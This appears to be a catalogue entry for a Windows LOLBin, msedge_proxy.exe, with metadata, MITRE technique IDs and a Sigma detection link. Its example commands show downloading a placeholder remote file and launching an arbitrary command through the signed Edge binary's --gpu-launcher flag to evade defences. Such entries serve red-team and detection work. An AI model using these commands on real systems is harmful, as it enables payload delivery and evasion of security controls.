---
id: windows-execution-msedge-proxy
namespace: windows:execution:msedge-proxy
name: msedge-proxy
description: 'Microsoft Edge Browser Located at: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe.'
author: Mert Daş
version: 1.0.0
capabilities:
- network.transfer.download
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- msedge-proxy
parameters: []
features: []
execution:
  template: msedge-proxy
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: msedge_proxy will download malicious file. (Download file from the internet)
  command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
- description: msedge_proxy.exe will execute file in the background (Executes a process under a trusted Microsoft signed binary)
  command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
references: []
techniques:
- exfiltration
- execution
- defense-evasion
mitre_ids:
- T1105
- T1218.015
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml
install:
- method: choco
  package_name: msedge-proxy
  commands:
  - choco install msedge-proxy
---


# msedge-proxy

msedge-proxy is a Windows LOLBin. Microsoft Edge Browser Located at: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe.
